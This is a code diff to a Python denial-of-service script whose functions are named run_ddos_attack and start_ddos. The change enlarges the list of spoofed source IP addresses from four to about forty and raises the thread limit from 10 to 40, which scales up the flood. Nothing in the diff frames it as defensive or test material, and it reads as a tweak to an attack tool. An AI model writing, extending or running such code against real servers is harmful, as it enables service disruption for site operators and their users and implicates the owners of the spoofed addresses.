@@ -181,14 +181,20 @@ async def run_ddos_attack(target_url, thread_count, spoofed_ip, start_time, dura
 
 def start_ddos():
     target = BASE_URL
-    spoofed_ips = ["102.145.234.20", "167.30.12.14", "179.30.99.15", "85.16.128.4"]
+    spoofed_ips = [
+        "102.145.234.20","167.30.12.14","179.30.99.15","85.16.128.4","163.172.16.1",
+        "12.116.23.14","45.88.201.17","91.204.33.122","203.17.89.201","154.67.12.98","72.190.44.11","188.23.177.54",
+  "61.132.205.8","109.45.77.143","217.91.12.199","34.221.56.78","146.12.88.211","58.174.39.62","192.83.14.170",
+  "75.66.201.94","131.209.18.33","220.47.155.72","96.143.221.5","171.88.64.120","43.217.11.201","124.55.178.39",
+  "211.14.90.163","68.229.45.87","156.77.203.14","84.190.132.244","177.25.61.108","28.199.74.31","115.66.208.191",
+  "198.41.97.55","53.144.23.176","140.87.211.64","222.109.38.142","99.175.84.219","174.52.166.27","37.118.205.93"]
     
     try:
-        threads_input = input("Enter number of threads (max 10) [default=5]: ")
+        threads_input = input("Enter number of threads (max 40) [default=5]: ")
         thread_count = int(threads_input) if threads_input.strip() else 5
         thread_time = input("Enter duration of attack (seconds) [default=15]: ")
         thread_time = int(thread_time) if thread_time.strip() else 15    
-        thread_count = min(thread_count, 10)
+        thread_count = min(thread_count, 40)
     except ValueError:
         thread_count = 5
         thread_time = 15
